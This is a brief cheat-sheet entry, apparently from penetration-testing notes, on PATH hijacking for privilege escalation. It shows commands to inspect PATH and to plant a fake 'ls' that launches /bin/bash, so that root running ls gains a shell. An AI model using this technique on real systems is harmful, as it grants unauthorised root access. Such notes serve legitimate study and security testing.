# PATH Hijacking

## Detection

echo $PATH

Check writable directories.

## Exploitation

Create malicious binary:

echo "/bin/bash" > ls
chmod +x ls

If root executes ls without path → root shell.
